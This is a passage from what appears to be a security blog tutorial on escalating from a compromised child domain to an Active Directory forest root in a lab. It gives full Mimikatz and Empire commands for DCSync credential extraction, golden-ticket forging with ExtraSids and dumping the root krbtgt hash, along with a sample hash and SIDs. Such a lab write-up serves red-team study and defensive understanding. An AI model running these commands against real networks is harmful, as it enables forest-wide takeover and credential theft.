<p><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/powerview_get_forest_domain.png"><img loading="lazy" class="aligncenter size-large wp-image-1686" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/powerview_get_forest_domain-1024x920.png" alt="powerview_get_forest_domain" width="640" height="575" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/powerview_get_forest_domain-1024x920.png 1024w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/powerview_get_forest_domain-300x269.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/powerview_get_forest_domain.png 1306w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/powerview_map_trusts_ldap.png"><img loading="lazy" class="aligncenter size-large wp-image-1687" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/powerview_map_trusts_ldap-1024x216.png" alt="powerview_map_trusts_ldap" width="640" height="135" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/powerview_map_trusts_ldap-1024x216.png 1024w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/powerview_map_trusts_ldap-300x63.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/powerview_map_trusts_ldap.png 1501w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>This is also possible through Empire with theÂ <strong>situational_awareness/network/mapdomaintrusts</strong> module.</p>
<h2>Step 2: DCSync the Child</h2>
<p>Now let&#8217;s extract the krbtgt account hash from a <strong>dev.testlab.local</strong> domain controller. Instead of having to install an agent, we can now use Mimikatz&#8217; DCSync to extract the hash. One thing to note is that you need to specify &#8220;&lt;NT4_DOMAINNAME&gt;\krbtgt&#8221; for the specified user for this to work properly (you can find the domain shortname easily with whoami or other methods).Â In this case we&#8217;re using DEV.</p>
<p>Here&#8217;s how it looks in our environment with Invoke-Mimikatz. Note that you need to use -Command &#8216;&#8221;COMMAND&#8221;&#8216; when running any custom commands through Invoke-Mimikatz (double quotes embedded in single quotes):</p>
<p><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/dev_dcsync.png"><img loading="lazy" class="aligncenter size-large wp-image-1671" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/dev_dcsync-1024x813.png" alt="dev_dcsync" width="640" height="508" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/dev_dcsync-1024x813.png 1024w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/dev_dcsync-300x238.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/dev_dcsync.png 1600w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>And here&#8217;s how we can execute the same functionality through Empire:</p>
<p><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dev_dcsync.png"><img loading="lazy" class="aligncenter size-large wp-image-1679" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dev_dcsync-1024x890.png" alt="empire_dev_dcsync" width="640" height="556" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dev_dcsync-1024x890.png 1024w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dev_dcsync-300x261.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dev_dcsync.png 1455w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>One nice note- Empire will now parse the DCSync output and save the output into the <a href="http://www.powershellempire.com/?page_id=114">credential store</a>:</p>
<p><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dcsync_creds.png"><img loading="lazy" class="aligncenter size-large wp-image-1680" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dcsync_creds-1024x138.png" alt="empire_dcsync_creds" width="640" height="86" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dcsync_creds-1024x138.png 1024w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dcsync_creds-300x40.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dcsync_creds.png 2028w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<h2>Step 3: ExtraSids to Hop up the Trust</h2>
<p>Now let&#8217;s use this compromised child DC krbtgt hash to compromise the forest root (and therefore the entireÂ forest). The <a href="https://www.youtube.com/watch?v=ns7M6zjWDrs">demo video</a> showed doing this straight from the same original workstation, but in our scenario we run into a problem: we can&#8217;t talk directly to the domain controller for theÂ <strong>testlab.local</strong> root. Happily for us, domain controllers in a forest have to be able to talk to each other for replication and shared authentication, so at a minimum in our scenario, the DCÂ for <strong>dev.testlab.local</strong>Â will have communication open to a DC inÂ <strong>testlab.local</strong>.</p>
<p>To hop up the trust, we need a few pieces of information:</p>
<ul>
<li>the krbtgt hash for the child domain (<strong>dev.testlab.local</strong>),<strong>Â </strong>which we just extracted with DCSync</li>
<li>the SID for <strong>dev.testlab.local</strong>, also in the DCSync output</li>
<li>the name of the target DEVÂ user for the ticket
<ul>
<li>In this case it&#8217;s going to be SECONDARY$, the name of DEV&#8217;s domain controller machine account. More on this shortly.</li>
</ul>
</li>
<li>the fully qualified domain name of the forest root (in our PowerView output)</li>
<li><del>the SID of the &#8220;Enterprise Admins&#8221; group of the root</del></li>
<li><strong>edit:</strong> <em>the SID of the &#8220;<a href="https://support.microsoft.com/en-us/kb/243330">Domain Controllers</a>&#8221; group (S-1-5-21domain-516), the SID of &#8220;Enterprise Domain Controllers&#8221; (S-1-5-9), and the SID of the SECONDARY$ domain controller (which you can get with &#8216;Get-NetComputer SECONDARY.dev.testlab.local&#8217; from PowerView), in this case S-1-5-21-4275052721-3205085442-2770241942-1002.</em></li>
</ul>
<p>To get the FQDN of the forest root, we could useÂ PowerView with <strong>Get-NetForestDomain</strong> orÂ <strong>Get-NetDomainTrust</strong>, or the following one-liner:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a97dbe60982952952866" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a97dbe60982952952866-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a97dbe60982952952866-1"><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">DirectoryServices</span><span class="crayon-sy">.</span><span class="crayon-v">ActiveDirectory</span><span class="crayon-sy">.</span><span class="crayon-v">Forest</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">GetCurrentForest</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-v">RootDomain</span><span class="crayon-sy">.</span><span class="crayon-v">Name</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0012 seconds] -->
<p>Then we need the SID of the forest root. I&#8217;m sure there are better ways to do this, but one easy one is to resolve the &#8216;krbtgt&#8217; account for the domain:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a97dbe609a2682871012" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
(New-Object System.Security.Principal.NTAccount("testlab.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value </textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a97dbe609a2682871012-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a97dbe609a2682871012-1"><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Security</span><span class="crayon-sy">.</span><span class="crayon-v">Principal</span><span class="crayon-sy">.</span><span class="crayon-e">NTAccount</span><span class="crayon-sy">(</span><span class="crayon-s">"testlab.local"</span><span class="crayon-sy">,</span><span class="crayon-s">"krbtgt"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">Translate</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Security</span><span class="crayon-sy">.</span><span class="crayon-v">Principal</span><span class="crayon-sy">.</span><span class="crayon-v">SecurityIdentifier</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-i">Value</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>Then we just replace the -502 in the SID <del>with -519 to get our Enterprise Admins SID forÂ <strong>testlab.localÂ </strong>(in this caseÂ S-1-5-21-456218688-4216621462-1491369290-519)</del>Â <strong>edit: </strong><em>with the -516 &#8220;Domain Controllers&#8221; SID (in this caseÂ S-1-5-21-456218688-4216621462-1491369290-516).</em>Â The Mimikatz commandÂ we&#8217;re going to ultimately use to build our trust-hopping ticket is:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a97dbe609a9556997193" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;del&gt;kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942 /sids:S-1-5-21-456218688-4216621462-1491369290-519 /ptt&lt;/del&gt;

&lt;strong&gt;Edit: &lt;/strong&gt;kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942 /groups:516 /sids:S-1-5-21-456218688-4216621462-1491369290-516,S-1-5-9 &lt;em&gt;/id:S-1-5-21-4275052721-3205085442-2770241942-1002 /ptt&lt;/em&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a97dbe609a9556997193-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a97dbe609a9556997193-2">2</div><div class="crayon-num" data-line="crayon-60a97dbe609a9556997193-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a97dbe609a9556997193-1"><span class="crayon-o">&lt;</span><span class="crayon-v">del</span><span class="crayon-o">&gt;</span><span class="crayon-v">kerberos</span><span class="crayon-o">::</span><span class="crayon-v">golden</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">user</span><span class="crayon-o">:</span><span class="crayon-v">SECONDARY</span><span class="crayon-sy">$</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">krbtgt</span><span class="crayon-o">:</span><span class="crayon-cn">8b7c904343e530c4f81c53e8f614caf7</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">domain</span><span class="crayon-o">:</span><span class="crayon-v">dev</span><span class="crayon-sy">.</span><span class="crayon-v">testlab</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">sid</span><span class="crayon-o">:</span><span class="crayon-v">S</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-o">-</span><span class="crayon-cn">5</span><span class="crayon-o">-</span><span class="crayon-cn">21</span><span class="crayon-o">-</span><span class="crayon-cn">4275052721</span><span class="crayon-o">-</span><span class="crayon-cn">3205085442</span><span class="crayon-o">-</span><span class="crayon-cn">2770241942</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">sids</span><span class="crayon-o">:</span><span class="crayon-v">S</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-o">-</span><span class="crayon-cn">5</span><span class="crayon-o">-</span><span class="crayon-cn">21</span><span class="crayon-o">-</span><span class="crayon-cn">456218688</span><span class="crayon-o">-</span><span class="crayon-cn">4216621462</span><span class="crayon-o">-</span><span class="crayon-cn">1491369290</span><span class="crayon-o">-</span><span class="crayon-cn">519</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">ptt</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">del</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a97dbe609a9556997193-2">&nbsp;</div><div class="crayon-line" id="crayon-60a97dbe609a9556997193-3"><span class="crayon-o">&lt;</span><span class="crayon-v">strong</span><span class="crayon-o">&gt;</span><span class="crayon-v">Edit</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">strong</span><span class="crayon-o">&gt;</span><span class="crayon-v">kerberos</span><span class="crayon-o">::</span><span class="crayon-v">golden</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">user</span><span class="crayon-o">:</span><span class="crayon-v">SECONDARY</span><span class="crayon-sy">$</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">krbtgt</span><span class="crayon-o">:</span><span class="crayon-cn">8b7c904343e530c4f81c53e8f614caf7</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">domain</span><span class="crayon-o">:</span><span class="crayon-v">dev</span><span class="crayon-sy">.</span><span class="crayon-v">testlab</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">sid</span><span class="crayon-o">:</span><span class="crayon-v">S</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-o">-</span><span class="crayon-cn">5</span><span class="crayon-o">-</span><span class="crayon-cn">21</span><span class="crayon-o">-</span><span class="crayon-cn">4275052721</span><span class="crayon-o">-</span><span class="crayon-cn">3205085442</span><span class="crayon-o">-</span><span class="crayon-cn">2770241942</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">groups</span><span class="crayon-o">:</span><span class="crayon-cn">516</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">sids</span><span class="crayon-o">:</span><span class="crayon-v">S</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-o">-</span><span class="crayon-cn">5</span><span class="crayon-o">-</span><span class="crayon-cn">21</span><span class="crayon-o">-</span><span class="crayon-cn">456218688</span><span class="crayon-o">-</span><span class="crayon-cn">4216621462</span><span class="crayon-o">-</span><span class="crayon-cn">1491369290</span><span class="crayon-o">-</span><span class="crayon-cn">516</span><span class="crayon-sy">,</span><span class="crayon-v">S</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-o">-</span><span class="crayon-cn">5</span><span class="crayon-o">-</span><span class="crayon-cn">9</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-v">em</span><span class="crayon-o">&gt;</span><span class="crayon-o">/</span><span class="crayon-v">id</span><span class="crayon-o">:</span><span class="crayon-v">S</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-o">-</span><span class="crayon-cn">5</span><span class="crayon-o">-</span><span class="crayon-cn">21</span><span class="crayon-o">-</span><span class="crayon-cn">4275052721</span><span class="crayon-o">-</span><span class="crayon-cn">3205085442</span><span class="crayon-o">-</span><span class="crayon-cn">2770241942</span><span class="crayon-o">-</span><span class="crayon-cn">1002</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">ptt</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">em</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0024 seconds] -->
<p>So we have a few options here. We could use Empire to WMI to the DC for <strong>dev.testlab.local</strong> and then run the <strong>credentials/mimikatz/golden_ticket</strong> module with the necessary information. For the Golden TicketÂ creation, we can use the saved krbtgt hash from the DCSync output, setting <strong>CredID</strong> to 1, the <strong>user</strong> to SECONDARY$, and the <strong>sids</strong> toÂ <del>S-1-5-21-456218688-4216621462-1491369290-519</del>Â <strong>edit:Â </strong><em>S-1-5-21-456218688-4216621462-1491369290-516,S-1-5-9</em>:</p>
<p><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dev_golden_ticket.png"><img loading="lazy" class="aligncenter size-large wp-image-1685" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dev_golden_ticket-1024x527.png" alt="empire_dev_golden_ticket" width="640" height="329" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dev_golden_ticket-1024x527.png 1024w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_dev_golden_ticket-300x154.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>We could also RDP to the DEV domain controller, use a <a href="https://gist.github.com/HarmJ0y/bb48307ffa663256e239">download cradle</a> to load up Mimikatz, and run our specified command.Â In either case, we now have administrator access to the domain controller (PRIMARY) for the <strong>testlab.local</strong> forest root!</p>
<p><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/primary_access.png"><img loading="lazy" class="aligncenter size-large wp-image-1689" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/primary_access-1024x533.png" alt="primary_access" width="640" height="333" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/primary_access-1024x533.png 1024w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/primary_access-300x156.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/primary_access.png 1442w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<h2>Step 4: DCSync the Forest Root</h2>
<p>We now have all the privileges needed to compromise the krbtgt hash of the forest root. This time our command will be a bit more complex. One thing we need is the domain NT4 shortname of the forest root.Â You <a href="https://gist.github.com/HarmJ0y/4226349db644e6549605">can use this Gist</a>, or you can translate the username to a SID and back again. In our case, the shortname is TESTLAB.</p>
<p>Here is the command we&#8217;ll be using:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a97dbe609ae066196438" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
lsadump::dcsync /user:TESTLAB\krbtgt /domain:testlab.local</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a97dbe609ae066196438-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a97dbe609ae066196438-1"><span class="crayon-v">lsadump</span><span class="crayon-o">::</span><span class="crayon-v">dcsync</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">user</span><span class="crayon-o">:</span><span class="crayon-v">TESTLAB</span><span class="crayon-sy">\</span><span class="crayon-v">krbtgt</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">domain</span><span class="crayon-o">:</span><span class="crayon-v">testlab</span><span class="crayon-sy">.</span><span class="crayon-v">local</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>If testlab.local had multiple domain controllers and we wanted to specify a particular one, we could use the /dc:DC.FQDN flag as well. This isÂ how it looks through Empire:</p>
<p><a href="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_primary_dcsync.png"><img loading="lazy" class="aligncenter size-large wp-image-1690" src="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_primary_dcsync-1024x860.png" alt="empire_primary_dcsync" width="640" height="538" srcset="http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_primary_dcsync-1024x860.png 1024w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_primary_dcsync-300x252.png 300w, http://www.harmj0y.net/blog/wp-content/uploads/2015/09/empire_primary_dcsync.png 1487w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>If we want a single Invoke-Mimikatz command to build/inject the Golden Ticket, DCSync the root, and then purge current tickets from the session, we can do that by space separating the double quoted Mimikatz commands:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a97dbe609b8593085745" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;del&gt;Invoke-Mimikatz -Command '"kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942 /sids:S-1-5-21-456218688-4216621462-1491369290-519 /ptt" "lsadump::dcsync /domain:testlab.local /dc:Primary.testlab.local /user:testlab\krbtgt" "kerberos::purge"'&lt;/del&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a97dbe609b8593085745-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a97dbe609b8593085745-1"><span class="crayon-o">&lt;</span><span class="crayon-v">del</span><span class="crayon-o">&gt;</span><span class="crayon-v">Invoke</span><span class="crayon-o">-</span><span class="crayon-v">Mimikatz</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Command</span><span class="crayon-h"> </span><span class="crayon-s">'"kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942 /sids:S-1-5-21-456218688-4216621462-1491369290-519 /ptt" "lsadump::dcsync /domain:testlab.local /dc:Primary.testlab.local /user:testlab\krbtgt" "kerberos::purge"'</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">del</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

